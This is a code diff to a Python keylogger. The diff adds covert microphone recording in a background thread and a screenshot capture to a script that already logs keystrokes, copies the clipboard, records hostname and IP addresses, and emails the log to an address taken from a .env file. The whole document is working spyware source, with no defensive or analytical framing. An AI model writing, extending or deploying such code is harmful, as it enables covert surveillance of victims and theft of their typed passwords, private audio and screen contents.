@@ -1,5 +1,5 @@
 # libraries
-
+import threading
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -32,12 +32,15 @@ log_file_path = os.path.join(script_directory, "log.txt")
 system_info_path = os.path.join(script_directory, "system_info.txt")
 clipboard_path = os.path.join(script_directory, "clipboard.txt")
 env_path = os.path.join(script_directory, ".env")
+audio_file_path = os.path.join(script_directory,"audio.wav")
+image_file_path = os.path.join(script_directory,"screenshot.png")
 load_dotenv(env_path)
 
 BUFFER_COUNT = 30
 buffer = ""
 keystroke_count = 0
 line_count = 0
+microphone_time = 10
 fromAddress = os.getenv('FROM_EMAIL_ADDRESS')
 password = os.getenv('PASSWORD')
 toAddress = os.getenv('TO_EMAIL_ADDRESS')
@@ -102,6 +105,12 @@ No of keystrokes : {1}\n\
 No of lines : {2}\n\
 =======================\n""".format(len(buffer), keystroke_count,line_count + 1)
 
+def microphone():
+	freq = 44100
+	recording = sd.rec(int(microphone_time * freq), samplerate = freq, channels = 2)
+	sd.wait()
+	write(audio_file_path, freq, recording)
+
 def write_log():
 	global keystroke_count, line_count, buffer
 	with open(log_file_path,"a") as out:
@@ -112,15 +121,14 @@ def write_log():
 	line_count = 0
 
 def getIP():
-    d = str(urlopen('http://checkip.dyndns.com/').read())
+	d = str(urlopen('http://checkip.dyndns.com/').read())
 
-    return r.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(d).group(1)
+	return r.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(d).group(1)
 
 def write_system_info():
 	with open(system_info_path,"w") as out:
 		hostname = socket.gethostname()
 		IP_addr = socket.gethostbyname(hostname)
-		print(IP_addr, type(IP_addr))
 		out.write("Hostname -> " + hostname + 
 		"\nPrivate IP Address -> " + IP_addr + "\n")
 		try:
@@ -133,14 +141,18 @@ def write_system_info():
 		)
 
 def copy_clipboard():
-    with open(clipboard_path,"w") as out:
-        try:
-            win32clipboard.OpenClipboard()
-            copied_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            out.write("Clipboard data:\n" + copied_data)
-        except:
-            out.write("Clipboard cannot be copied")
+	with open(clipboard_path,"w") as out:
+		try:
+			win32clipboard.OpenClipboard()
+			copied_data = win32clipboard.GetClipboardData()
+			win32clipboard.CloseClipboard()
+			out.write("Clipboard data:\n" + copied_data)
+		except:
+			out.write("Clipboard cannot be copied")
+
+def screenshot():
+	image = ImageGrab.grab()
+	image.save(image_file_path)
 
 def on_release(key):
 	# break loop on pressing esc
@@ -148,11 +160,21 @@ def on_release(key):
 		write_log()
 		write_system_info()
 		copy_clipboard()
+		screenshot()
 		send_email("log.txt", log_file_path, toAddress)
 		return False
 
+print("Keylogger Started...")
 
-# what to do when a key is pressed and released respectively
-with Listener(on_press = on_press, on_release = on_release) as listener:
-	print("Keylogger Started...")
-	listener.join()
+# Define a function to run microphone() and listener.join() in parallel
+def run_in_parallel():
+	# Create a thread for microphone function
+	microphone_thread = threading.Thread(target=microphone)
+	microphone_thread.start()
+
+	# Run listener.join() in the main thread
+	with Listener(on_press=on_press, on_release=on_release) as listener:
+		listener.join()
+
+# Start the parallel execution
+run_in_parallel()
